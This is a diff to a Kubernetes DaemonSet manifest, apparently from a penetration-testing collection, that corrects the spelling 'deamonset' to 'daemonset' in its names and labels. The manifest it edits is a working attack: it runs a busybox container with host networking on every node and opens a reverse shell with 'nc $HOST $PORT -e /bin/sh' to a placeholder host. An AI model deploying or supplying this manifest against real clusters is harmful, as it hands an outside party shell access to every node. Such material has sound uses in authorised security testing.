@@ -1,24 +1,24 @@
 apiVersion: apps/v1
 kind: DaemonSet
 metadata:
-  name: hostnetwork-revshell-deamonset
+  name: hostnetwork-revshell-daemonset
   labels:
     app: pentest
-    type: deamonset
+    type: daemonset
 spec:
   selector:
     matchLabels:
       app: pentest
-      type: deamonset
+      type: daemonset
   template:
     metadata:
       labels:
         app: pentest
-        type: deamonset
+        type: daemonset
     spec:
       hostNetwork: true
       containers:
-      - name: hostnetwork-revshell-deamonset
+      - name: hostnetwork-revshell-daemonset
         image: busybox
         command: [ "/bin/sh", "-c", "--" ]
         args: [ "nc $HOST $PORT  -e /bin/sh;" ]
